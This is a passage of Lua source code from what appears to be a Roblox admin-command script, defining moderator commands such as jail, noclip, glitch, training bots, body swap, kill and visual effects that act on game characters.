set.Remote(v,'Function','Effect','slip')
end
end)

set.MakeCommand('NoClips the target player(s)',2,set.Prefix,{'noclip'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Noclip','norm')
end
end)

set.MakeCommand('Old flying NoClip',2,set.Prefix,{'flynoclip','oldnolcip'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Noclip','fly')
end
end)

set.MakeCommand('Un-NoClips the target player(s)',2,set.Prefix,{'clip','unnoclip'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Noclip','off')
end
end)

set.MakeCommand('Jails the target player(s), removing their tools until they are un-jailed',2,set.Prefix,{'jail','imprison'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v.Character and v.Character:FindFirstChild("Torso") then 
local cf = v.Character.Torso.CFrame + Vector3.new(0,1,0)
local origpos = v.Character.Torso.Position
local mod = Instance.new("Model", game.Workspace) mod.Name = v.Name .. " Epix Jail" table.insert(set.objects, mod) 
local value = Instance.new('StringValue',mod) value.Name='Player' value.Value=v.Name
local top = Instance.new("Part", mod) top.Locked = true top.formFactor = "Symmetric" top.Size = Vector3.new(6,1,6) top.TopSurface = 0 top.BottomSurface = 0 top.Anchored = true top.BrickColor = BrickColor.new("Really black") top.CFrame = cf * CFrame.new(0,-3.5,0)
set.JailedTools[v.Name]=Instance.new('Model') 
local bottom = top:Clone() bottom.Transparency = 1 bottom.Parent = mod bottom.CFrame = cf * CFrame.new(0,3.5,0)
local front = top:Clone() front.Transparency = 1 front.Reflectance = 0 front.Parent = mod front.Size = Vector3.new(6,6,1) front.CFrame = cf * CFrame.new(0,0,-3)
local back = front:Clone() back.Transparency = 1 back.Parent = mod back.CFrame = cf * CFrame.new(0,0,3)
local right = front:Clone() right.Transparency = 1 right.Parent = mod right.Size = Vector3.new(1,6,6) right.CFrame = cf * CFrame.new(3,0,0)
local left = right:Clone() left.Transparency = 1 left.Parent = mod left.CFrame = cf * CFrame.new(-3,0,0)
local msh = Instance.new("BlockMesh", front) msh.Scale = Vector3.new(1,1,0)
local msh2 = msh:Clone() msh2.Parent = back
local msh3 = msh:Clone() msh3.Parent = right msh3.Scale = Vector3.new(0,1,1)
local msh4 = msh3:Clone() msh4.Parent = left
local brick = Instance.new('Part',mod)
local box = Instance.new('SelectionBox',brick)
box.Adornee=brick
box.Color=BrickColor.new('White')
brick.Anchored=true
brick.CanCollide=false
brick.Transparency=1
brick.Size=Vector3.new(5,7,5) 
brick.CFrame=cf--*CFrame.new(0,-1,0)
v.Character.Torso.CFrame = cf
for l,k in pairs(v.Backpack:children()) do 
	if k and k.ClassName=='Tool' or k.ClassName=='HopperBin' then 
		k.Parent=set.JailedTools[v.Name]
	end 
end
coroutine.wrap(function()
repeat
	local player=game:service('Players'):FindFirstChild(v.Name)
	if not player then return end
	local torso=player.Character:FindFirstChild('Torso')
	if not torso then return end
	if not set.JailedTools[v.Name] or set.JailedTools[v.Name]==nil then set.JailedTools[v.Name]=Instance.new('Model') end
	for l,k in pairs(player.Backpack:children()) do 
		if k and k.ClassName=='Tool' or k.ClassName=='HopperBin' then 
			k.Parent=set.JailedTools[v.Name]--tools 
		end 
	end 
	if (torso.Position-origpos).magnitude>5 then
		torso.CFrame = cf 
	end
	wait()
until not mod or not mod.Parent or set.JailedTools[v.Name]==nil
end)()
end
end)()
end
end)

set.MakeCommand('UnJails the target player(s) and returns any tools that were taken from them while jailed',2,set.Prefix,{'unjail','free','release'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do 
	coroutine.wrap(function() 
		if v then 
			for a, jl in pairs(game.Workspace:children()) do 
				if jl.Name == v.Name .. " Epix Jail" then 
					jl:Destroy() 
				end 
			end 
		if set.JailedTools[v.Name] then
			for j,tewl in pairs(set.JailedTools[v.Name]:children()) do 
				if tewl then
					tewl.Parent=v.Backpack 
				end
			end
			set.JailedTools[v.Name]=nil
		end
	set.JailedTools[v.Name]=nil 
end
end)()
end
end)

set.MakeCommand('Gives the target player(s) a little chat gui, when used will let them chat using dialog bubbles',2,set.Prefix,{'bchat','dchat','bubblechat','dialogchat'},{'player','color(red/green/blue)'},2,function(plr,args)
	local color=Enum.ChatColor.Red
	if not args[2] then
		color=Enum.ChatColor.Red
	elseif args[2]:lower()=='red' then
		color=Enum.ChatColor.Red
	elseif args[2]:lower()=='green' then
		color=Enum.ChatColor.Green
	elseif args[2]:lower()=='blue' then
		color=Enum.ChatColor.Blue
	end
	for i,v in pairs(set.GetPlayers(plr,(args[1] or plr.Name))) do
		set.Remote(v,"Function","BubbleChat",color)
	end
end)

set.MakeCommand('Shows you where the target player(s) is/are',2,set.Prefix,{'track','trace','find'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		set.Remote(plr,'Function','Find','on',v)
	end
end)

set.MakeCommand('Stops tracking the target player(s)',2,set.Prefix,{'untrack','untrace','unfind'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		set.Remote(plr,'Function','Find','off',v)
	end
end)

set.MakeCommand('Makes the target player(s)\'s character teleport back and forth rapidly, quite trippy, makes bricks appear to move as the player turns their character',2,set.Prefix,{'glitch','glitchdisorient','glitch1','gd'},{'player','intensity'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		local num=args[2] or 15
		set.Remote(v,'Function','Glitch','trippy',num)
	end
end)

set.MakeCommand('The same as gd but less trippy, teleports the target player(s) back and forth in the same direction, making two ghost like images of the game',2,set.Prefix,{'glitch2','glitchghost','gg'},{'player','intensity'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		local num=args[2] or 150
		set.Remote(v,'Function','Glitch','ghost',num)
	end
end)

set.MakeCommand('Kinda like gd, but teleports the player to four points instead of two',2,set.Prefix,{'vibrate','glitchvibrate','gv'},{'player','intensity'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		local num=args[2] or 0.1
		set.Remote(v,'Function','Glitch','vibrate',num)
	end
end)

set.MakeCommand('UnGlitchs the target player(s)',2,set.Prefix,{'unglitch','unglitchghost','ungd','ungg','ungv'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		set.Remote(v,'Function','Glitch','off')
	end
end)

set.MakeCommand('Shows you the current message of the day',0,set.AnyPrefix,{'motd','messageoftheday','daymessage'},{},0,function(plr,args)
	set.PM('Message of the Day',plr,game:service('MarketplaceService'):GetProductInfo(set.MessageOfTheDayID).Description)
end)

set.MakeCommand('Makes a clone of target player(s)\'s character and parents their real on to their local camera, no one can see them until they are unphased',2,set.Prefix,{'phase'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		coroutine.wrap(function()
		for k,m in pairs(workspace:children()) do if m.Name==v.Name and m:FindFirstChild('FakeCharPhased') then m:Destroy() end end
		set.Remote(v,'Function','Phase',false)
		wait(set.Ping(v)+0.3)
		for a,obj in pairs(v.Character:children()) do if obj.Name~='HumanoidRootPart' then if obj:IsA("BasePart") then obj.Transparency = 0 if obj:findFirstChild("face") then obj.face.Transparency = 0 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 0 end end end
		v.Character.Archivable=true
		local hum=v.Character:FindFirstChild('Humanoid')
		local cl=v.Character:clone()
		v.Character.Archivable=false
		pcall(function() cl.Animate:Destroy() end)
		local anim=deps.Animate:clone()
		anim.Parent=cl
		anim.Disabled=false
		local val=Instance.new('StringValue',cl)
		val.Name='FakeCharPhased'
		cl.Parent=workspace
		v.Character.Torso.CFrame=v.Character.Torso.CFrame*CFrame.new(0,0,1)
		for a,obj in pairs(v.Character:children()) do if obj:IsA("BasePart") then obj.Transparency = 1 if obj:findFirstChild("face") then obj.face.Transparency = 1 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 1 end end
		set.Remote(v,'Function','Phase',true)
		repeat wait() until not hum or not hum.Parent or not cl or not cl.Parent
		if cl then cl:Destroy() end
		end)()
	end
end)

set.MakeCommand('UnPhases the target player(s)',2,set.Prefix,{'unphase'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		for k,m in pairs(workspace:children()) do if m.Name==v.Name and m:FindFirstChild('FakeCharPhased') then m:Destroy() end end
		set.Remote(v,'Function','Phase',false)
		v.Character:MakeJoints()
		print(v.Character.Humanoid.Health)
		wait(set.Ping(v)+0.3)
		v.Character:MakeJoints()
		print(v.Character.Humanoid.Health)
		for a,obj in pairs(v.Character:children()) do if obj.Name~='HumanoidRootPart' then if obj:IsA("BasePart") then obj.Transparency = 0 if obj:findFirstChild("face") then obj.face.Transparency = 0 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 0 end end end
	end
end)

set.MakeCommand('Removes the bubble chat gui from the target player(s)',2,set.Prefix,{'unbchat','unbubblechat','undchat','undialogchat'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,(args[1] or plr.Name))) do
		set.Remote(v,'Function','BubbleChat','off')
	end
end)

set.MakeCommand('Gives the target player(s) tools that are in their StarterPack',2,set.Prefix,{'startertools','starttools'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
for a,q in pairs(game.StarterPack:children()) do q:Clone().Parent = v.Backpack end
end
end))
end
end)

set.MakeCommand('Gives the target player(s) a sword',2,set.Prefix,{'sword','givesword'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
local sword = Instance.new("Tool", v.Backpack) sword.Name = "Sword"  sword.TextureId = "rbxasset://Textures/Sword128.png"
sword.GripForward = Vector3.new(-1,0,0)
sword.GripPos = Vector3.new(0,0,-1.5)
sword.GripRight = Vector3.new(0,1,0)
sword.GripUp = Vector3.new(0,0,1)
local handle = Instance.new("Part", sword) handle.Name = "Handle" handle.FormFactor = "Plate" handle.Size = Vector3.new(1,.8,4) handle.TopSurface = 0 handle.BottomSurface = 0
local msh = Instance.new("SpecialMesh", handle) msh.MeshId = "rbxasset://fonts/sword.mesh" msh.TextureId = "rbxasset://textures/SwordTexture.png"
local cl=deps.SwordScript:clone() cl.Parent=sword cl.Disabled=false
end
end))
end
end)

set.MakeCommand('Clones the target player(s)',2,set.Prefix,{'clone','cloneplayer'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
v.Character.Archivable = true 
local cl = v.Character:Clone() 
table.insert(set.objects,cl) 
cl.Parent = game.Workspace 
cl:MoveTo(v.Character:GetModelCFrame().p)
cl:MakeJoints()
v.Character.Archivable = false 
repeat wait() until not cl or not cl.Humanoid or cl.Humanoid.Health<=0
wait(5)
if cl then cl:Destroy() end
end
end)()
end
end)

set.MakeCommand('Configurable AIs made for training, :bot me 5 true true true makes 5 bots that attack, stack, and run to players to kill them',2,set.Prefix,{'bot','tbot','trainingbot','bots','robot','robots','dummy','dummys','testdummy','testdummys','dolls','doll'},{'plr','num','walk','attk','swarm','speed','dmg','hp','dist'},9,function(plr,args)
	local walk=false 
	if args[3] then if args[3]:lower()=='true' or args[3]:lower()=='yes' then walk=true end end
	local attack=false
	if args[4] then if args[4]:lower()=='true' or args[4]:lower()=='yes' then attack=true end end
	local health=args[8] or 100
	local damage=args[7] or 10
	local walkspeed=args[6] or 20
	local dist=args[9] or 100
	local swarm=false
	if args[5] then if args[5]:lower()=='true' or args[5]:lower()=='yes' then swarm=true end end
	local function makedolls(player)
		local num=args[2] or 1
		local pos=player.Character.Torso.CFrame
		num=tonumber(num)
		if num>50 then num=50 end
		for i=1,num do
			coroutine.wrap(function()
				player.Character.Archivable = true
				local cl = player.Character:Clone() 
				player.Character.Archivable = false
				table.insert(set.objects,cl)
				local anim=script['Script Dependencies'].Animate:Clone()
				anim.Parent=cl 
				anim.Disabled=false
				cl.Parent = game.Workspace 
				cl.Name='~=Bot=~'
				if cl:FindFirstChild('Animate') then cl.Animate:Destroy() end
				cl.Humanoid.MaxHealth=health
				wait()
				cl.Humanoid.Health=health
				cl.Torso.CFrame=pos*CFrame.Angles(0,math.rad(360/num*i),0)*CFrame.new(5+.2*num,0,0)
				cl:MakeJoints()
				cl.Humanoid.WalkSpeed=walkspeed
				for k,f in pairs(cl:children()) do if f.ClassName=='ForceField' then f:Destroy() end end
				local run=true
				local thing
				local target
				local chasing=false
				local function find()
					for k,n in pairs(game:service('Players'):GetPlayers()) do
						coroutine.wrap(function()
							if swarm and not chasing and n:DistanceFromCharacter(cl.Torso.Position) < tonumber(dist) then
								n=n.Character
								if not n:FindFirstChild('Humanoid') or not n:FindFirstChild('Torso') or n.Humanoid.Health>=math.huge or n:FindFirstChild('ForceField') then return end
								target=n.Torso
								chasing=true
								repeat wait() until chasing==false or n.Humanoid.Health<=0 or n.Humanoid.Health>=math.huge or n:FindFirstChild('ForceField') or not n:FindFirstChild('Torso') or not n
								chasing=false
							end
						end)()
					end
				end
				coroutine.wrap(function()
					if not cl.Humanoid or not cl.Torso then return end
					thing=cl.Torso.Touched:connect(function(hit) 
						coroutine.wrap(function()
							if attack and run and cl and hit.Parent:FindFirstChild('Humanoid') and hit.Parent:FindFirstChild('Torso') and hit.Parent.Name~='~=Bot=~' then
								if hit.Parent.Humanoid.Health>=math.huge or hit.Parent:FindFirstChild('ForceField') then return end
								hit.Parent.Humanoid.Health=hit.Parent.Humanoid.Health-damage
								target=hit.Parent.Torso
								chasing=true
								repeat wait() until chasing==false or hit.Parent.Humanoid.Health<=0 or hit.Parent.Humanoid.Health>=math.huge or hit.Parent:FindFirstChild('ForceField') or not hit.Parent:FindFirstChild('Torso') or not hit.Parent
								chasing=false
							end
						end)()
						
					end)
					repeat
						if not walk then return end
						if cl.Humanoid.Sit then
							cl.Humanoid.Jump=true
							cl.Humanoid.Sit=false
						end
						if chasing then
							wait() 
							cl.Humanoid.WalkToPoint=target.Position
							if math.abs(cl.Torso.Position.Y-target.Position.Y)>7 then
								cl.Humanoid.Jump=true
							end
						else
							cl.Humanoid.WalkToPoint=Vector3.new(math.random(cl.Torso.Position.X-100,cl.Torso.Position.X+100),cl.Torso.Position.Y,math.random(cl.Torso.Position.Z-100,cl.Torso.Position.Z+100))
							wait(1)
						end
						pcall(find)
						wait()
					until not cl or not cl.Humanoid or cl.Humanoid.Health<=0 or not run
				end)()
				repeat wait() until not cl or not cl.Humanoid or cl.Humanoid.Health<=0 or not run
				run=false
				pcall(function() thing:disconnect() end)
				wait(2)
				pcall(function() if cl then cl:Destroy() end end)
			end)()
		end
	end
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		makedolls(v)
	end
end)

set.MakeCommand('Gives you a tool that lets you click where you want the target player to stand, hold r to rotate them',2,set.Prefix,{'clickteleport','teleporttoclick','ct','clicktp','forceteleport','ctp','ctt'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
local tool=Instance.new('HopperBin',plr.Backpack)
local cl=deps.ClickToTool:clone()
cl.Target.Value=v.Name
cl.Mode.Value='Teleport'
cl.Parent=tool
cl.Disabled=false
end)()
end
end)

set.MakeCommand('Gives you a tool that lets you click where you want the target player to walk, hold r to rotate them',2,set.Prefix,{'clickwalk','cw','ctw','forcewalk','walktool','walktoclick','clickcontrol','forcewalk'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
local tool=Instance.new('HopperBin',plr.Backpack)
local cl=deps.ClickToTool:clone()
cl.Target.Value=v.Name
cl.Mode.Value='Walk'
cl.Parent=tool
cl.Disabled=false
end)()
end
end)

set.MakeCommand('Swaps player1\'s and player2\'s bodies and tools',2,set.Prefix,{'bodyswap','bodysteal','bswap'},{'player1','player2'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
	for i2,v2 in pairs(set.GetPlayers(plr,args[2])) do
		local temptools=Instance.new('Model')
		local tempcloths=Instance.new('Model')
		local vpos=v.Character.Torso.CFrame
		local v2pos=v2.Character.Torso.CFrame
		local vface=v.Character.Head.face
		local v2face=v2.Character.Head.face
		vface.Parent=v2.Character.Head
		v2face.Parent=v.Character.Head
		for k,p in pairs(v.Character:children()) do
			if p:IsA('BodyColors') or p:IsA('CharacterMesh') or p:IsA('Pants') or p:IsA('Shirt') or p:IsA('Hat') then
				p.Parent=tempcloths
			elseif p:IsA('Tool') then
				p.Parent=temptools
			end
		end	
		for k,p in pairs(v.Backpack:children()) do
			p.Parent=temptools
		end
		for k,p in pairs(v2.Character:children()) do
			if p:IsA('BodyColors') or p:IsA('CharacterMesh') or p:IsA('Pants') or p:IsA('Shirt') or p:IsA('Hat') then
				p.Parent=v.Character
			elseif p:IsA('Tool') then
				p.Parent=v.Backpack
			end
		end	
		for k,p in pairs(tempcloths:children()) do
			p.Parent=v2.Character
		end	
		for k,p in pairs(v2.Backpack:children()) do
			p.Parent=v.Backpack
		end
		for k,p in pairs(temptools:children()) do
			p.Parent=v2.Backpack
		end
		v2.Character.Torso.CFrame=vpos
		v.Character.Torso.CFrame=v2pos
	end
	end 
end)

set.MakeCommand('Lets you take control of the target player',2,set.Prefix,{'control','takeover'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
v.Character.Humanoid.PlatformStand = true
local w = Instance.new("Weld", plr.Character.Torso ) 
w.Part0 = plr.Character.Torso 
w.Part1 = v.Character.Torso  
local w2 = Instance.new("Weld", plr.Character.Head) 
w2.Part0 = plr.Character.Head 
w2.Part1 = v.Character.Head  
local w3 = Instance.new("Weld", plr.Character:findFirstChild("Right Arm")) 
w3.Part0 = plr.Character:findFirstChild("Right Arm")
w3.Part1 = v.Character:findFirstChild("Right Arm") 
local w4 = Instance.new("Weld", plr.Character:findFirstChild("Left Arm"))
w4.Part0 = plr.Character:findFirstChild("Left Arm")
w4.Part1 = v.Character:findFirstChild("Left Arm") 
local w5 = Instance.new("Weld", plr.Character:findFirstChild("Right Leg")) 
w5.Part0 = plr.Character:findFirstChild("Right Leg")
w5.Part1 = v.Character:findFirstChild("Right Leg") 
local w6 = Instance.new("Weld", plr.Character:findFirstChild("Left Leg")) 
w6.Part0 = plr.Character:findFirstChild("Left Leg")
w6.Part1 = v.Character:findFirstChild("Left Leg") 
plr.Character.Head.face:Destroy()
for i, p in pairs(v.Character:children()) do
if p:IsA("BasePart") then 
p.CanCollide = false
end
end
for i, p in pairs(plr.Character:children()) do
if p:IsA("BasePart") then 
p.Transparency = 1 
elseif p:IsA("Hat") then
p:Destroy()
end
end
v.Character.Parent = plr.Character
--v.Character.Humanoid.Changed:connect(function() v.Character.Humanoid.PlatformStand = true end)
end
end)()
end
end)

set.MakeCommand('Refreshes the target player(s)\'s character',2,set.Prefix,{'refresh','reset'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
local pos=v.Character.Torso.CFrame
local temptools={}
pcall(function() v.Character.Humanoid:UnequipTools() end)
wait()
for k,t in pairs(v.Backpack:children()) do
	if t:IsA('Tool') or t:IsA('Hopperbin') then
		table.insert(temptools,t)
	end
end
v:LoadCharacter()
v.Character.Torso.CFrame=pos
for d,f in pairs(v.Character:children()) do
	if f:IsA('ForceField') then f:Destroy() end
end
wait(1)
v.Backpack:ClearAllChildren()
for l,m in pairs(temptools) do
	m:clone().Parent=v.Backpack
end
end)()
end
end)

set.MakeCommand('Kills the target player(s)',2,set.Prefix,{'kill'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then v.Character:BreakJoints() end
end)()
end
end)

set.MakeCommand('Repsawns the target player(s)',2,set.Prefix,{'respawn'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then v:LoadCharacter()
	set.Remote(v,'Function','SetView','reset')
end
end)()
end
end)

set.MakeCommand('Repsawns the target player(s)',2,set.Prefix,{'re'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then v:LoadCharacter()
	set.Remote(v,'Function','SetView','reset')
end
end)()
end
end)

set.MakeCommand('Rotates the target player(s) by 180 degrees or the angle you set',2,set.Prefix,{'trip'},{'player','angle'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local angle=180 or args[2]
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
v.Character.Torso.CFrame = v.Character.Torso.CFrame * CFrame.Angles(0,0,math.rad(angle)) 
end
end)()
end
end)

set.MakeCommand('Stuns the target player(s)',2,set.Prefix,{'stun'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.PlatformStand = true
end
end)()
end
end)

set.MakeCommand('UnStuns the target player(s)',2,set.Prefix,{'unstun'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.PlatformStand = false
end
end)()
end
end)

set.MakeCommand('Forces the target player(s) to jump',2,set.Prefix,{'jump'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.Jump = true
end
end)()
end
end)

set.MakeCommand('Forces the target player(s) to sit',2,set.Prefix,{'sit','seat'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.Sit = true
end
end)()
end
end)

set.MakeCommand('Makes the target player(s) invisible',2,set.Prefix,{'invisible'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Transparency = 1 if obj:findFirstChild("face") then obj.face.Transparency = 1 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 1 end
end
end
end)()
end
end)

set.MakeCommand('Makes the target player(s) visible',2,set.Prefix,{'visible'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") and obj.Name~='HumanoidRootPart' then obj.Transparency = 0 if obj:findFirstChild("face") then obj.face.Transparency = 0 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 0 end
end
end
end)()
end
end)

set.MakeCommand('Locks the target player(s)',2,set.Prefix,{'lock'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr,args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Locked = true elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Locked = true end
end
end
end)()
end
end)

set.MakeCommand('UnLocks the the target player(s), makes it so you can use btools on them',2,set.Prefix,{'unlock'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Locked = false elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Locked = false end
end
end
end)()
end
end)

set.MakeCommand('Explodes the target player(s)',2,set.Prefix,{'explode','boom','boomboom'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
local ex = Instance.new("Explosion", game.Workspace) 
ex.Position = v.Character.Torso.Position
ex.BlastRadius=20
end
end)()
end
end)

set.MakeCommand('Makes a PointLight on the target player(s) with the color specified',2,set.Prefix,{'light'},{'player','color'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local str = BrickColor.new('Bright blue').Color
if args[2] then
local teststr = args[2]
if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
end
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local p=Instance.new('PointLight',v.Character.Torso)
table.insert(set.objects,p)
p.Color=str
p.Brightness=5
p.Range=15
end
end)()
end
end)

set.MakeCommand('UnLights the target plyer(s)',2,set.Prefix,{'unlight'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for z, cl in pairs(v.Character.Torso:children()) do 
	if cl:IsA('PointLight') then cl:Destroy() end 
end
end
end)()
end
end)

set.MakeCommand('Makes a dialog bubble appear over the target player(s) head with the desired message',-1,set.Prefix,{'talk','maketalk'},{'player','message'},2,function(plr,args)
local message = args[2]
for i,p in pairs(set.GetPlayers(plr, args[1]:lower())) do
coroutine.wrap(function()
game:service('Chat'):Chat(p.Character.Head,message,Enum.ChatColor.Blue)
end)()
end
end)

set.MakeCommand('Sets the target player(s) on fire, coloring the fire based on what you set',-1,set.Prefix,{'fire','makefire','givefire'},{'player','color'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local str = BrickColor.new('Bright orange').Color
if args[2] then
local teststr = args[2]
if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
end
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local f=Instance.new('Fire',v.Character.Torso)
local p=Instance.new('PointLight',v.Character.Torso)
table.insert(set.objects,f)
table.insert(set.objects,p)
p.Color=str
p.Brightness=5
p.Range=15
f.Color=str
f.SecondaryColor=str
end
end)()
end
end)

set.MakeCommand('Puts out the flames on the target player(s)',-1,set.Prefix,{'unfire','removefire','extinguish'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Fire") or cl:IsA('PointLight') then cl:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Makes smoke come from the target player(s) with the desired color',-1,set.Prefix,{'smoke','givesmoke'},{'player','color'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local str = BrickColor.new('Bright orange').Color
if args[2] then
local teststr = args[2]
if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
end
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local cl = Instance.new("Smoke", v.Character.Torso) table.insert(set.objects, cl)
cl.Color=str
end
end)()
end
end)

set.MakeCommand('Removes smoke from the target player(s)',-1,set.Prefix,{'unsmoke'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Smoke") then cl:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Puts sparkles on the target player(s) with the desired color',-1,set.Prefix,{'sparkles'},{'player','color'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local str = BrickColor.new('Bright blue').Color
if args[2] then
local teststr = args[2]
if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
end
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local cl = Instance.new("Sparkles", v.Character.Torso) table.insert(set.objects, cl)
local p=Instance.new('PointLight',v.Character.Torso) table.insert(set.objects, p)
p.Color=str
p.Brightness=5
p.Range=15
cl.SparkleColor=str
end
end)()
end
end)

set.MakeCommand('Removes sparkles from the target player(s)',-1,set.Prefix,{'unsparkles'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Sparkles") or cl:IsA('PointLight') then cl:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Gives a force field to the target player(s)',2,set.Prefix,{'ff','forcefield'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
